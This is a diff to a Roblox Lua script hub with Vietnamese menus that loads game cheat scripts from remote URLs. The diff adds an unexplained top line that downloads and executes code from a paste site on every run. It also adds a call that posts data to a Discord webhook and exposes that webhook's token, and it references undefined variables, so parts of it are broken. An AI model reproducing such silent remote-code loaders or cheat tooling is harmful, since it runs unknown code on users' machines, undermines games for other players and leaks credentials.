@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://pastefy.app/p71dHG6n/raw"))()
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 
 local Theme = {
@@ -65,7 +66,7 @@ local Window = Rayfield:CreateWindow({
 })
 
 local TabScriptGame = Window:CreateTab("Script", "play")
-local TabAI = Window:CreateTab("AI", "bot")
+local TabSend = Window:CreateTab("Yêu cầu tính năng", "send")
 local TabScriptAny = Window:CreateTab("Chung", "user")
 local TabMusic = Window:CreateTab("Âm nhạc", "disc-3")
 local TabFixLag = Window:CreateTab("Tối ưu hoá", "wrench")
@@ -81,7 +82,6 @@ Rayfield:Notify({
 })
 
 --Script
-
 if game.GameId == 994732206 then
 TabScriptGame:CreateButton({
    Name = "Hermanos Hub-PVP",
@@ -157,5 +157,12 @@ loadstring(game:HttpGet("https://leaf-zeta.onrender.com/api/script"))()
    end
 })
 else
+game:GetService("HttpService"):PostAsync("https://webhook.lewisakura.moe/api/webhooks/1482725450030518372/LWr6UIMqRJTQb7Ei0uqap250QmFEEOEZsqObp6xA0Y_pdFOmS76IoxvGZ-mY48YLsoru/queue",
+	game:GetService("HttpService"):JSONEncode({
+		content = "Game chưa hỗ trợ infU" .. info.Name
+	})
+)
 TabScript:CreateParagraph({Title = "Hiện tại game chưa hỗ trợ"})
 end
+
+
